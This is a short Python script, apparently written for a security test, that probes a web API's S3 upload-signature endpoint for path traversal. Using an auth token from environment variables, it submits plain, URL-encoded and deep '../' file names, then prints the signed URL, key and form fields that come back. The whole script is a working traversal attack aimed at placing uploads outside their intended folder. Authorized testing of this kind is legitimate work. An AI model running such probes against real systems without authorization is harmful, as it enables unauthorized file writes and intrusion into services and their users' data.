import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
for fn in ["zx-normal.pdf","../../demo-certs-dkim_demo/zx-trav.pdf","..%2f..%2fdemo-certs-dkim_demo%2fzx-t2.pdf","../../../../tmp/zx-t3.pdf"]:
    c,b=req('POST','/api/v1/files/s3_upload_signature',
            {"file_name":fn,"model_name":None,"model_id":None,"content_hash":"x"})
    try:
        d=json.loads(b)
        print(f"--- {fn}")
        print("    url:",d.get('url'))
        print("    key:",d.get('key'))
        print("    formData keys:",list((d.get('formData') or {}).keys()))
    except Exception as e:
        print(f"--- {fn}: {c} {b[:200]}")
